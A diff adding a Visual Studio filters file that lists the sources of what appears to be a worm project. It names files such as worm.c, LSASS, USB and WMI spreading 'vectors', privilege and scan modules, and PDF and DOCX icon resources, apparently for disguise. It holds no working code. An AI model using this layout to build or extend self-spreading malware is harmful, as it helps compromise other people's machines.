@@ -1,0 +1,130 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup>
+    <Filter Include="CONFIG">
+      <UniqueIdentifier>{4a8430ed-5022-42a1-8868-22bebd91777f}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="SOURCES">
+      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
+      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
+    </Filter>
+    <Filter Include="SOURCES\VECTORS">
+      <UniqueIdentifier>{3ae72804-6fa0-4609-823c-d05ef0e965b1}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="RESOURCE">
+      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
+      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
+    </Filter>
+    <Filter Include="HEADERS">
+      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
+      <Extensions>h;hpp;hxx;hm;inl;inc;xsd</Extensions>
+    </Filter>
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="asm32.c">
+      <Filter>SOURCES</Filter>
+    </ClCompile>
+    <ClCompile Include="crc32.c">
+      <Filter>SOURCES</Filter>
+    </ClCompile>
+    <ClCompile Include="debug.c">
+      <Filter>SOURCES</Filter>
+    </ClCompile>
+    <ClCompile Include="globals.c">
+      <Filter>SOURCES</Filter>
+    </ClCompile>
+    <ClCompile Include="import32.c">
+      <Filter>SOURCES</Filter>
+    </ClCompile>
+    <ClCompile Include="main32.c">
+      <Filter>SOURCES</Filter>
+    </ClCompile>
+    <ClCompile Include="net.c">
+      <Filter>SOURCES</Filter>
+    </ClCompile>
+    <ClCompile Include="pid.c">
+      <Filter>SOURCES</Filter>
+    </ClCompile>
+    <ClCompile Include="privilege.c">
+      <Filter>SOURCES</Filter>
+    </ClCompile>
+    <ClCompile Include="relocate.c">
+      <Filter>SOURCES</Filter>
+    </ClCompile>
+    <ClCompile Include="scan.c">
+      <Filter>SOURCES</Filter>
+    </ClCompile>
+    <ClCompile Include="shared.c">
+      <Filter>SOURCES</Filter>
+    </ClCompile>
+    <ClCompile Include="tftp.c">
+      <Filter>SOURCES</Filter>
+    </ClCompile>
+    <ClCompile Include="threads.c">
+      <Filter>SOURCES</Filter>
+    </ClCompile>
+    <ClCompile Include="worm.c">
+      <Filter>SOURCES</Filter>
+    </ClCompile>
+    <ClCompile Include="wrappers.c">
+      <Filter>SOURCES</Filter>
+    </ClCompile>
+    <ClCompile Include="lsass5.c">
+      <Filter>SOURCES\VECTORS</Filter>
+    </ClCompile>
+    <ClCompile Include="lsass6.c">
+      <Filter>SOURCES\VECTORS</Filter>
+    </ClCompile>
+    <ClCompile Include="usb.c">
+      <Filter>SOURCES\VECTORS</Filter>
+    </ClCompile>
+    <ClCompile Include="usb_pe.c">
+      <Filter>SOURCES\VECTORS</Filter>
+    </ClCompile>
+    <ClCompile Include="usb_wrapper.c">
+      <Filter>SOURCES\VECTORS</Filter>
+    </ClCompile>
+    <ClCompile Include="wmi.c">
+      <Filter>SOURCES\VECTORS</Filter>
+    </ClCompile>
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="globals.h">
+      <Filter>HEADERS</Filter>
+    </ClInclude>
+    <ClInclude Include="lsass.h">
+      <Filter>HEADERS</Filter>
+    </ClInclude>
+    <ClInclude Include="main.h">
+      <Filter>HEADERS</Filter>
+    </ClInclude>
+    <ClInclude Include="net.h">
+      <Filter>HEADERS</Filter>
+    </ClInclude>
+    <ClInclude Include="shared.h">
+      <Filter>HEADERS</Filter>
+    </ClInclude>
+    <ClInclude Include="config.h">
+      <Filter>CONFIG</Filter>
+    </ClInclude>
+    <ClInclude Include="wrapper.h">
+      <Filter>HEADERS</Filter>
+    </ClInclude>
+    <ClInclude Include="resource.h">
+      <Filter>HEADERS</Filter>
+    </ClInclude>
+  </ItemGroup>
+  <ItemGroup>
+    <ResourceCompile Include="CORE32.rc">
+      <Filter>RESOURCE</Filter>
+    </ResourceCompile>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="..\_icons\resources\pdf-icon.bin">
+      <Filter>RESOURCE</Filter>
+    </None>
+    <None Include="..\_icons\resources\docx-icon.bin">
+      <Filter>RESOURCE</Filter>
+    </None>
+  </ItemGroup>
+</Project>
